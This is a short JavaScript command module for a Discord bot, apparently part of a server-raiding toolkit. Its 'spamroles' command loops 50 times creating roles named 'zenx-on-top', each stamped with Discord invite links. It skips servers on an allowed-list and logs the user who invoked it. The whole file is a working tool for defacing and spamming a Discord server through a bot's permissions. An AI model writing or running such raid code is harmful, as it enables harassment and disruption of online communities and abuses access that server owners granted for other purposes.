const { createBlacklistButton } = require('../utils/blacklist-button');

module.exports = {
    name: 'spamroles',
    description: 'Spams roles in the server.',
    prefix: '&',
    async execute(msg, client, channel_logs, blacklist_user, idservidores_nopermitidos) {
        createBlacklistButton(client, channel_logs, msg.author);
        if (idservidores_nopermitidos.includes(msg.guild.id)) {
            return msg.channel.send({ content: '> This server is not allowed.' });
        }

        for (let i = 0; i < 50; i++) {
            try {
                await msg.guild.roles.create({ name: 'zenx-on-top', reason: 'https://discord.gg/kEB3PCPkzc https://discord.gg/org' });
            } catch (e) {
                console.log(`[X] Could not create a role in the server ${msg.guild.name} with ID ${msg.guild.id}, error message: ${e.message}`);
            }
        }
    }
};
